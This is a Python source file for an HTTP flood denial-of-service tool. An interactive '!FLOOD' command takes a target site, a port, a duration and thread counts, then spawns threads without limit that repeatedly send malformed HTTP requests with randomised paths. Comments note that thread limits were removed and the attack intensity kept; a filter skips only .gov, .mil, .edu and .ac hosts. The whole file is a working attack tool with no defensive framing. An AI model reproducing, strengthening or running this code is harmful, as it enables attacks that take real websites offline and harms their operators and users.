# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import select
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

stop_attack = threading.Event()

# Clear screen
def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

# Generate random URL path
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    return "".join(random.sample(msg, int(num)))

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    return ''.join(random.choice(letter) for _ in range(int(num)))

# Attack logic - Maintained original intensity
def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
    if stop_attack.is_set():
        return
    
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Maintain all original payload variations
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        elif data_type_loader_packet == 'TEST3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
        elif data_type_loader_packet == 'TEST5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
            
        s.connect((ip, port))
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            s.send(packet_data)  # Maintained double send from original
    except:
        pass
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
    while time.time() < time_loader and not stop_attack.is_set():
        # Maintain original thread spawning intensity
        for _ in range(spam_loader):
            if stop_attack.is_set():
                break
            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet))
            th.start()
            # Removed thread.join() to maintain parallel intensity

# Countdown with interrupt - Your improved version
def countdown_timer(time_loader):
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()

        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
            _ = sys.stdin.readline()
            stop_attack.set()
            print(f"\n{Fore.RED}Attack Stopped{Fore.RESET}")
            return

        time.sleep(1)
        remaining = int(time_loader - time.time())

    if not stop_attack.is_set():
        print(f"\n{Fore.GREEN}Attack Completed{Fore.RESET}")
        stop_attack.set()

# MAIN COMMAND LOOP - Your improved version
def command():
    global stop_attack
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
                stop_attack.set()
                sys.exit(0)

            args_get = data_input_loader.split(" ")
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 10:
                    data_type_loader_packet = args_get[1].upper()
                    target_loader = args_get[2]
                    port_loader = int(args_get[3])
                    time_loader = time.time() + int(args_get[4])
                    spam_loader = int(args_get[5])
                    create_thread = int(args_get[6])  # Removed thread limit
                    booter_sent = int(args_get[7])
                    methods_loader = args_get[8]
                    spam_create_thread = int(args_get[9])  # Removed thread limit

                    host = ''
                    ip = ''
                    try:
                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                        if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
                            print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                            continue
                        ip = socket.gethostbyname(host)
                    except socket.gaierror:
                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    print(f"{Fore.LIGHTCYAN_EX}Attack Started\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")

                    # Maintain original thread spawning intensity
                    for loader_num in range(create_thread):
                        sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} OF {create_thread} CREATE THREAD . . .{Fore.RESET}")
                        sys.stdout.flush()
                        for _ in range(spam_create_thread):
                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet)).start()

                    countdown_timer(time_loader)
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
